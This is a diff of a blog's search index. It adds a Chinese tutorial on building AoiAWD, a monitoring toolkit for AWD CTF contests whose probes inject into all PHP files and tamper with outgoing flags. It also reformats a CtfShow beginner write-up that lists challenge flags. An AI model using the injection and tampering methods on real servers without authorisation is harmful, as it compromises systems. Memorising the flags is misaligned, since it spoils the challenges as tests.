@@ -1,6 +1,146 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AoiAWD-萌新的得分利器</title>
+    <url>/posts/16692/</url>
+    <content><![CDATA[<h1>前言</h1>
+<p>这两天玩了一下bugku的awd模式，因为之前也没有正式玩过，所以本萌新被各位师傅打得惨惨。这里分享一个安恒维护的开源项目AoiAWD，不过搭建可谓是问题连连。昨天一共有10轮，因为使用不当，导致前五轮都在传探针和执行的过程，所以错过了前五轮的机会，后面五轮都在看师傅们打过来的马和流量，去用着师傅们的马去连接别人的拿flag得分…QWQ。等有时间也研究一下批量写马和获取flag的套路。这里贴一下最后的结果图吧，一共50支队伍，最后得了第七名惨惨😫<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/GALX2N9Z%28%7D%28ZN%28I%242F7K3%247.png" alt=""></p>
+<h1>项目</h1>
+<h2 id="项目说明"><a class="header-anchor" href="#项目说明">¶</a>项目说明</h2>
+<p>这里直接贴官方的说明</p>
+<blockquote>
+<p>在常见的AWD比赛中，选手往往拥有一台（或若干台）开放了SSH服务和题目服务的“靶机”作为自己防守的阵地。</p>
+<p>在实际比赛中，主办方往往会限制选手的SSH权限到一般用户/仅可管理题目的权限。并且针对一些常见的通用防火墙脚本（通防脚本）进行轮询式check。</p>
+<p>AoiAWD是针对以上场景的限制和痛点设计的，组件间基于socket通信以便灵活部署，具有图形可视化界面。所有行为探针均支持在最低系统权限下运行，且默认不会干扰题目业务逻辑的正常运行，可以绕过绝大部分check脚本的行为检查。支持如下维度的行为捕获能力：</p>
+<ul>
+<li>Web输入输出数据捕获、输出流量篡改（没错，你可以动态替换掉输出的flag为任意字符串）</li>
+<li>PWN类题目输入输出交互流量包捕获、当次运行时内存结构捕获、输出流量篡改</li>
+<li>服务器进程UID、PID、父进程、启动参数、运行时间捕获</li>
+<li>服务器文件系统新建、删除、修改、权限变化行为捕获。</li>
+</ul>
+<p>本系统还内置了生命周期钩子，可以针对某一次行为的产生编写特定的插件去实现流量层面的临时热补丁、增加大屏告警、替换输出字符等操作。系统默认内置了如下插件可供参考：</p>
+<ul>
+<li>FlagBuster: 当检测到输出流量中包含了符合正则的flag字符串，产生大屏告警、标记触发规则的数据包、并将flag精准替换为看起来也像flag的随机数。</li>
+<li>KingWatcher: KoH类比赛中，当有其他队伍替换掉了赛点文件时，产生大屏告警。</li>
+<li>ZombieKiller: 当文件系统上出现了不死马行为，标记可疑文件并产生大屏告警。</li>
+</ul>
+</blockquote>
+<h3 id="AoiAWD-Core"><a class="header-anchor" href="#AoiAWD-Core">¶</a>AoiAWD Core</h3>
+<p>是整个系统运行的核心，负责探针数据收集入库、插件生命周期管理、Web前端托管服务。</p>
+<ul>
+<li>运行compile.php即可打包为一个单独的二进制文件，方便携带。</li>
+<li>插件需要放到和aoiawd.phar同目录下的plugins文件夹，Web端有直接重载插件的按钮，可以实现热更新。</li>
+<li>一般情况下可直接无参数运行，如果需要特别的配置，可以增加-h参数查看帮助信息。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AoiAWD: Data Visualization Tool &amp; Main Server</span><br><span class="line">Usage: .&#x2F;aoiawd.phar [OPTIONS]</span><br><span class="line">         -w [URI] HTTP server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:1337</span><br><span class="line">         -l [URI] Log recoard server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:8023</span><br><span class="line">         -m [URI] MongoDB server URI. Default: mongodb:&#x2F;&#x2F;127.0.0.1:27017</span><br><span class="line">         -t [STRING] Access token. Default: [RANDOM]</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行后会显示本次启动后的临时密钥，是访问Web前端的必要信息</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2020-09-24 15:21:21] MainServer.notice: AccessToken: 0de8d57b3e91dc66 [] [] #&lt;-- Web访问密钥</span><br><span class="line">...</span><br><span class="line">[2020-09-24 15:21:21] Amp\Http\Server\Server.info: Listening on http:&#x2F;&#x2F;0.0.0.0:1337&#x2F; [] [] #&lt;-- Web前端地址</span><br><span class="line">[2020-09-24 15:21:21] aoicommon\socket\AsyncTCPServer.info: Listening on 0.0.0.0:8023 [] [] #&lt;-- 探针上线地址</span><br></pre></td></tr></table></figure>
+<h3 id="Guardian"><a class="header-anchor" href="#Guardian">¶</a>Guardian</h3>
+<p>一个二进制PWN的影子外壳，其原理是包裹在PWN题目外侧，在每次被启动的时候透明记录STDIN与STDOUT的流量，并快照PWN程序的内存结构(/proc/???/mem)上传回AoiAWD Core。</p>
+<ul>
+<li>在项目目录运行compile.php将会编译影子壳程序和捆绑程序: guardian.phar，一般是在选手电脑上进行捆绑后将生成文件上传到靶机。</li>
+<li>直接运行捆绑程序会输出帮助文本，其中比较重要的一些参数是:
+<ul>
+<li>-i: 输入需要套壳的PWN题目程序路径</li>
+<li>-s: 输入可以从靶机访问到探针上线地址的URL，比如说192.168.???.???:8023</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Guardian: AoiAWD ELF PWNMonitor Tool</span><br><span class="line">Usage: .&#x2F;guardian.phar [PATH]</span><br><span class="line">         -i [PATH] Original ELF.</span><br><span class="line">         -o [PATH] Path of patched ELF. Default: &#123;$OriginalELF&#125;.guardianed</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
+<h3 id="TapeWorm"><a class="header-anchor" href="#TapeWorm">¶</a>TapeWorm</h3>
+<p>一个PHP Web的影子外壳，其原理是自动注入到<strong>所有</strong>PHP文件的头部，支持输入输出流量的抓取与上报，同时具有处理输出数据的能力，实现输出内容篡改。</p>
+<ul>
+<li>程序内部的代码已经实现了单实例启动，即便是层层include了多次，也只会运行最先触发的影子外壳。所以不用担心复杂的题目影响性能。</li>
+<li>自动注入程序会智能识别面向对象的文件(包含 namespace 关键字)，和直接面向过程的PHP文件，<strong>一般</strong>情况下不会造成语法错误。</li>
+<li>自动注入程序会识别已经被注入的脚本并加以跳过，所以多次反复无脑对web根目录运行注入程序并不会造成什么太大的问题。</li>
+<li>运行compile.php就可以生成自动注入程序，一般情况下可以上传到靶机上直接对web根目录进行注入，或者在选手电脑上注入好之后再上传到靶机上。</li>
+<li><strong>一时注入一时爽，忘记备份宕机慌</strong></li>
+<li>直接运行注入程序会显示帮助文本，其中比较重要的一些参数是:
+<ul>
+<li>-d: 需要注入外壳的web根目录，会从此目录递归感染所有的PHP文件。</li>
+<li>-s: 输入可以从靶机访问到探针上线地址的URL，比如说192.168.???.???:8023。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TapeWorm: AoiAWD PHP WebMonitor Tool</span><br><span class="line">Usage: .&#x2F;tapeworm.phar [PATH]</span><br><span class="line">         -d [PATH] WebMonitor inject dir.</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -f [PATH] Inject file path. Default: &#123;$dir&#125;</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
+<h3 id="RoundWorm"><a class="header-anchor" href="#RoundWorm">¶</a>RoundWorm</h3>
+<p>一个监控文件系统和进程的系统行为监视器，其原理是扫描/proc文件夹获取当前正在运行的所有进程的信息，以及利用Linux系统的inotify功能对指定文件夹的敏感文件操作进行全面的记录。</p>
+<ul>
+<li>直接运行make就可以编译生成</li>
+<li>一般来讲该程序在靶机上运行，选手电脑上没必要执行这玩意。</li>
+<li>添加-h参数即可看到帮助文档，其中比较重要的一些参数是:
+<ul>
+<li>-d: 后台运行，你当然不想关掉ssh的时候就把探针也给关了。</li>
+<li>-s: 输入可以从靶机访问到探针上线地址的IP，比如说192.168.???.???。</li>
+<li>-w: 需要监控文件变化的路径，如果有多个路径使用’;'分割，比如: -w “/tmp;/var/www/html”</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RoundWorm: AoiAWD Filesystem &amp; Process Monitor Tool</span><br><span class="line">Usage: .&#x2F;roundworm [OPTIONS]</span><br><span class="line">         -d Running in daemon mode.</span><br><span class="line">         -s [HOST] AoiAWD Probe IP. Default: 127.0.0.1</span><br><span class="line">         -p [PORT] AoiAWD Probe PORT. Default: 8023</span><br><span class="line">         -w [PATH] Inotify watch dir, &#39;;&#39; as divider. Default: &#x2F;tmp</span><br><span class="line">         -i [MSECOND] Process watch interval. Default: 100</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
+<h2 id="搭建流程"><a class="header-anchor" href="#搭建流程">¶</a>搭建流程</h2>
+<p>这里我使用的是阿里云的ubuntu18.04系统<br>
+项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a><br>
+首先需要更新一波</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>
+<p><strong>安装git和下载项目</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;DasSecurity-HatLab&#x2F;AoiAWD.git</span><br></pre></td></tr></table></figure>
+<p><strong>安装inotifywait</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir inotifywait   #新建文件夹</span><br><span class="line">cd inotifywait      #进入文件夹</span><br><span class="line">wget http:&#x2F;&#x2F;github.com&#x2F;downloads&#x2F;rvoicilas&#x2F;inotify-tools&#x2F;inotify-tools-3.14.tar.gz   #下载</span><br><span class="line">tar zxf inotify-tools-3.14.tar.gz   #解压</span><br><span class="line">cd inotify-tools-3.14&#x2F;</span><br><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install #安装</span><br></pre></td></tr></table></figure>
+<p>可用<code>man inotifywait</code>命令查看文档以确定是否安装正确，然后按q退出<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/QXB3LNP%7B6%25LVW~Y%60%5DIXGSJ0.png" alt=""><br>
+<strong>安装mongdb需要的依赖</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mongodb-server</span><br><span class="line">sudo apt-get install php7.2-dev php-pear</span><br><span class="line">sudo pecl install mongodb   				#这里下载速度需要等多点时间</span><br></pre></td></tr></table></figure>
+<p>下面分别是这三条命令安装成功的截图：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_1.png" alt=""><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_2.png" alt=""><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_3.png" alt=""><br>
+如果出现了提示<code>You should add &quot;extension=mongodb.so&quot; to php.ini</code>说明成功了，接着我们去php的配置文件php.ini进行修改<br>
+路径一般为:<code>/etc/php/7.2/cli/php.ini</code>，<a href="http://%E6%88%91%E4%BB%AC%E5%86%8D%E6%8B%93%E5%B1%95%E5%A4%84%E5%8A%A0%E4%B8%8Aextension=mongodb.so">我们再拓展处加上extension=mongodb.so</a><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/3CBP_L%2507KRWPG%40EF96MB0A.png" alt=""><br>
+然后再把这两个开关改成Off，记住要把前面的分号去掉，不然会被注释掉<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7SM9T%60%5BK%29%7D52XNR_%40~1HI6L.png" alt=""><br>
+<strong>构建Fronted项目</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install npm      #安装npm</span><br><span class="line">cd AoiAWD  			#进入下载的项目</span><br><span class="line">cd Frontend</span><br><span class="line">npm install</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
+<p>下面分别是最后两条命令执行成功的截图：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7%24%401QSWN4%40%5B%24%60FGF~CQFT%5DV.png" alt=""><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7R5E7F8J%24NH69%60%60Q%5DOCHN%608.png" alt=""><br>
+执行成功会在dist/目录下得到index.html和static目录</p>
+<p><strong>构建AoiAWDcore</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">rm -rf src&#x2F;public&#x2F;*						#删除</span><br><span class="line">cp -r ..&#x2F;Frontend&#x2F;dist&#x2F;* src&#x2F;public&#x2F;	  #复制静态资源</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
+<p>执行成功截图：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/D%5DS33%60%25S3%28_CZKLE_4XTFH3.png" alt=""><br>
+执行成功后得到aoiawd.phar</p>
+<p><strong>构建TapeWorm</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd TapeWorm</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
+<p>构建成功后得到tapeworm.phar</p>
+<p><strong>构建Guardian</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Guardian</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
+<p>构建成功后得到guardian.phar</p>
+<p><strong>构建RoundWorm</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd RoundWorm</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>构建成功会得到roundworm<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/8A8%24_NC6%7BHMR%5DVZM%24Z%7B4C%409.png" alt=""><br>
+<strong>启动AoiAWD</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">sudo mongod</span><br><span class="line">.&#x2F;aoiawd.phar</span><br></pre></td></tr></table></figure>
+<p>执行后：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/4%7D89%5DOMY%25KLM%60K85%7DX%5D%40N_K.png" alt=""><br>
+会提供一个随机token和开放三个端口，1337是web访问端口，8023是探针的接收端口，然后我们通过ip:1337去访问开启的AoiAWD界面<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/PG2FKEM%24%5D%5B6P3BH%5B5IHV270.png" alt=""></p>
+<h2 id="使用方法"><a class="header-anchor" href="#使用方法">¶</a>使用方法</h2>
+<p>搭建完后把刚刚那些文件夹中的生成的文件例如xxx.phar等发送到提供给我们的靶机上去，然后记得赋予权限，ip是云服务器ip，端口就是默认8023</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x tapeworm.phar</span><br><span class="line">chmod +x roundworm</span><br><span class="line">chmod +x guardian.phar</span><br><span class="line">.&#x2F;tapeworm.phar -d 目录 -s ip:port</span><br><span class="line">.&#x2F;roundworm  -w 目录 -s ip -p port</span><br><span class="line">.&#x2F;guardian.phar -i 目录 -s ip:port</span><br></pre></td></tr></table></figure>
+<p>这里贴当时比赛的一些图：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/Q%28%25%25P14U%7DOJ~%29C5ZO1%24XR0S.png" alt=""><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/VMCECNOZK%295W79%6019%60%606U%28G.png" alt=""></p>
+]]></content>
+      <tags>
+        <tag>AWD</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku自动签到程序</title>
     <url>/posts/51649/</url>
     <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
@@ -417,12 +557,12 @@ emmm…这波有点难受。</p>
   <entry>
     <title>CtfShow萌新区WP</title>
     <url>/posts/25127/</url>
-    <content><![CDATA[<h1>前言</h1>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
 <p>对，我就是萌新，哭哭。<br>
 萌新系列需要萌新码开启，按照第一题提示加群即可获得，不过有些题有时候显示不出来，所以我记录的话会断断续续的<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/DDB74BA5D9F54D97E757A1B862D52268.gif" width = "200" height = "200" style="float: left;"/></p>
-<h1>Crypto</h1>
-<h2 id="密码1"><a class="header-anchor" href="#密码1">¶</a>密码1</h2>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto">¶</a>Crypto</h2>
+<h3 id="密码1"><a class="header-anchor" href="#密码1">¶</a>密码1</h3>
 <p>给出了一串16进制的数据，我们先转换成str<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/_FDUR7%7B_ZR%7BCBF%28LSX9%5D69S.png" alt=""><br>
 得到一串base64编码的数据，我们再去解一下base64<br>
@@ -431,12 +571,12 @@ emmm…这波有点难受。</p>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/%28Y5DCLQXOI%24%29MQ7DLZA36%288.png" alt=""><br>
 在栏数为19的时候得到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;dffb06a33eeeb0d259c84bd8cf146d08-&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h2>
+<h3 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h3>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%812/IO2LW3_4X%24VPD56%25%5D422DWS.png" alt=""><br>
 我们去看一下键盘，发现被rdcvbg 2qase3 6tghu7分别包围的键是f、w和y<br>
 于是按照格式得到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;fwy&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="密码3"><a class="header-anchor" href="#密码3">¶</a>密码3</h2>
+<h3 id="密码3"><a class="header-anchor" href="#密码3">¶</a>密码3</h3>
 <p>题目给出一段字符，看起来是莫斯密码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. &#x2F;-- -.. -- -.. -.. --&#x2F; -- -- -- -- -- &#x2F;-- -.. -.. -- -.. -- &#x2F;-- -.. -.. -- </span><br></pre></td></tr></table></figure>
 <p>解密后得到</p>
@@ -445,26 +585,26 @@ emmm…这波有点难受。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AABBABABAAABBBABABBAAAAAAABBABAABBA</span><br></pre></td></tr></table></figure>
 <p>再进行培根密码解密<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%813/2719%7B%7D%24~3%5BWB_M%28I%291N%5DNL2.png" alt=""></p>
-<h2 id="密码4"><a class="header-anchor" href="#密码4">¶</a>密码4</h2>
+<h3 id="密码4"><a class="header-anchor" href="#密码4">¶</a>密码4</h3>
 <p>给出一串base64编码，去解码一下<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/Z0_%7D%28ACQDPSWIDCT%7B7ZN%24_F.png" alt=""><br>
 再次base家族base85解密<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/04JMGQ%293%28%60W39UZ%24PK~F%5DUT.png" alt=""><br>
 得到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;base_base_base&#125;</span><br></pre></td></tr></table></figure>
-<h1>Misc</h1>
-<h2 id="隐写1"><a class="header-anchor" href="#隐写1">¶</a>隐写1</h2>
+<h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2>
+<h3 id="隐写1"><a class="header-anchor" href="#隐写1">¶</a>隐写1</h3>
 <p>下载下来的png文件打不开，提示错误，放进010进去查看<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/J_%28%5BAFO4S%5B3K%40C%29S03_%5DY1J.png" alt=""><br>
 发现文件头错误，png文件头应该是89504E47，将99改成89，再保存打开文件，得到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/%60H%5D8C_3VB0IV%7D%25_UF7UEB%5B6.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;zhe_ci_meiyou_ctfshow&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="隐写2"><a class="header-anchor" href="#隐写2">¶</a>隐写2</h2>
+<h3 id="隐写2"><a class="header-anchor" href="#隐写2">¶</a>隐写2</h3>
 <p>下载下来得到一张jpg图片，图片提示jphs隐写，用Jphswin工具打开<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/9%606%7BK5P%5DIM%60X5%60%29K%5B6YXU%29V.png" alt=""><br>
 点击seek解密，密码没有，就空着不写，然后另存为txt文本，得到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;202cb962ac59075b964b07152d234b70&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新_隐写2</h2>
+<h3 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新_隐写2</h3>
 <p>下载文件得到一个加密的zip压缩包<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/E%296IXVG444M%24KA5B1%25%29_1XN.png" alt=""><br>
 提示我们是密码是生日，所以最长有8位数字，直接压缩包爆破<br>
@@ -472,11 +612,11 @@ emmm…这波有点难受。</p>
 得到压缩包密码为：19981000<br>
 打开压缩包后得到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;brute_force&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新隐写3"><a class="header-anchor" href="#萌新隐写3">¶</a>萌新隐写3</h2>
+<h3 id="萌新隐写3"><a class="header-anchor" href="#萌新隐写3">¶</a>萌新隐写3</h3>
 <p>这题直接打开图片地址，就有flag，emmm<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%993/B9XXQPT35%7BX4%40%7BFNUL8BA6Y.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;xinti_gkd&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新隐写4"><a class="header-anchor" href="#萌新隐写4">¶</a>萌新隐写4</h2>
+<h3 id="萌新隐写4"><a class="header-anchor" href="#萌新隐写4">¶</a>萌新隐写4</h3>
 <p>下载的是一个doc文档<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/QQ%E6%88%AA%E5%9B%BE20210115224404.png" alt=""><br>
 这里光标停在下边多一行，猜测可能有文字被隐藏了，所以我们去选项打开显示一下隐藏文字<br>
@@ -485,7 +625,7 @@ emmm…这波有点难受。</p>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/7G8X7YG1%601~MKYZZO2F%40%282J.png" alt=""><br>
 当然还有一种办法，就是crtl+a全选复制到外面(隐藏的文字一起被选中)，就可以看到flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;word_stega&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新隐写5"><a class="header-anchor" href="#萌新隐写5">¶</a>萌新隐写5</h2>
+<h3 id="萌新隐写5"><a class="header-anchor" href="#萌新隐写5">¶</a>萌新隐写5</h3>
 <p>打开，给了我们一段unicode编码<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/ZT%5BEJQ%60WI%7B4%5D%28%7D%5D0E1UR7Y7.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀</span><br></pre></td></tr></table></figure>
@@ -498,7 +638,7 @@ emmm…这波有点难受。</p>
 <p>base32解密得到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/23ZKJ5~_DQAM%40E0%29%5BOC3%24LE.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag(hao_jiu_bu_yong_b32_)</span><br></pre></td></tr></table></figure>
-<h2 id="萌新隐写6"><a class="header-anchor" href="#萌新隐写6">¶</a>萌新隐写6</h2>
+<h3 id="萌新隐写6"><a class="header-anchor" href="#萌新隐写6">¶</a>萌新隐写6</h3>
 <p>下载下来是一个音频文件，拖进音频分析软件里<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%25OX%7D_%7DD_%252AZA%7DOH3V0P%25F0.png" alt=""><br>
 看到一段有规律的波形，应该是莫斯密码，长的替换成-，短的替换成.</p>
@@ -506,24 +646,24 @@ emmm…这波有点难受。</p>
 <p>莫斯密码解密得到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%7DZ%5D%40_5%24_FYQ1CQ_FY%5BVY%7D%290.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;MUZIKISG00D&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="杂项1"><a class="header-anchor" href="#杂项1">¶</a>杂项1</h2>
+<h3 id="杂项1"><a class="header-anchor" href="#杂项1">¶</a>杂项1</h3>
 <p>打开，题目说明如下<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/%28JU4MLHWM7%5D%60D2_K%7BP7T%5BPA.png" alt=""><br>
 那我们直接拿这个md5去解一下<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/F%25ZBJ%40T~%25K%7BTI%5DRYX%60DUDJV.png" alt=""><br>
 得到结果为：helloctf，所以flag是</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="杂项2"><a class="header-anchor" href="#杂项2">¶</a>杂项2</h2>
+<h3 id="杂项2"><a class="header-anchor" href="#杂项2">¶</a>杂项2</h3>
 <p>下载下来得到一个压缩包，解压后是一张png图片<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/QF%29BKVD%7D9VL3ONLAYJF%40%405U.png" alt=""><br>
 丢进010观察，看到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/XZR9%408LLSZROT6%25~D7%28%5B%2987.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ctfshow_im_coming&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新杂项3"><a class="header-anchor" href="#萌新杂项3">¶</a>萌新杂项3</h2>
+<h3 id="萌新杂项3"><a class="header-anchor" href="#萌新杂项3">¶</a>萌新杂项3</h3>
